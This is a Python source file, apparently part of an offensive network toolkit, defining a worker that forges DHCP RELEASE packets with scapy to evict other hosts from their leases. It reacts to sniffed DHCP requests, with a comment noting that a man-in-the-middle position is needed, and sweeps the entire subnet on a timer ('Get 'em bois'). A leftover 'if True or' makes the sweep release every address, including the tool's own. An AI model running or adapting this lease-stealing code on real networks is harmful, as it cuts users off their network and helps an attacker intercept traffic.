from arcane.dhcp.lease_generator import DHCPLeaseGenerator
from arcane.network.interface import NetworkInterface
from arcane.events import DHCPReleaseEvent
from arcane.runtime import loop, trigger_event, on_event, api
from arcane.network.interface import NetworkInterface
from arcane.threaded_worker import ThreadedWorker
from arcane.dhcp.lease import DHCPLease
from arcane.events import NetworkInterfaceEvent
from scapy.all import BOOTP, DHCP, IP
import time

class DHCPReleaser(ThreadedWorker):
    def __init__(self, interface: NetworkInterface, lease_generator: DHCPLeaseGenerator, server_ip: str, server_mac: str=None, sweep_time: int=30) -> None:
        self.interface       = interface
        self.lease_generator = lease_generator
        self.server_ip       = server_ip
        self.server_mac      = server_mac or self.interface.arp_table.get_or_ask(self.server_ip)
        self.sweep_time      = sweep_time
        super().__init__()


    @on_event(NetworkInterfaceEvent.READ)
    @api
    def handle_packet(self, iface, proto, packet):
        if DHCP in packet and packet[BOOTP].op == 1:
            options = DHCPLease.parse_options(packet[DHCP].options, strip_type=False)

            # This is a unicast packet. We need to be MitM for this to work
            if options['message-type'] == 3:
                del options['message-type']

                if 'requested_addr' in options:
                    del options['requested_addr']

                self.release_ip(DHCPLease.parse_client_ip(packet), options)


    @api
    def release_ip(self, ip_address: str, options: dict=None):
        try:
            mac = self.interface.arp_table[ip_address]
            self.log.info(f"Releasing {ip_address} for {mac}")

            lease = DHCPLease(
                mac_address=mac,
                ip_address=ip_address,
                server_mac=self.server_mac,
                server_ip=self.server_ip,
                options=options or {'client_id': b'\x01' + DHCPLease.serialize_mac(mac)},
                duration=0
            )

            self.interface.send(lease.build_release_packet())
            trigger_event(DHCPReleaseEvent.LEASE_RELEASED, lease)
        except KeyError:
            self.log.debug(f"{ip_address} not in ARP table")



    @loop(5)
    def _scan(self):
        # By not sleeping when encountering IPs on leases we own, we ensure that the
        # sweep time of each iteration decreases as we steal leases. This effectively
        # fixes the pacing of the packets in exchange for convergence
        sleep_time   = self.sweep_time / self.interface.network.num_addresses
        packets_sent = 0

        for ip in self.interface.network:
            # It's not us, and we didn't assign it. Get 'em bois
            if True or str(ip) not in self.lease_generator.claimed and str(ip) != self.interface.ip_address:
                self.release_ip(str(ip), do_after=sleep_time*packets_sent)
                packets_sent += 1
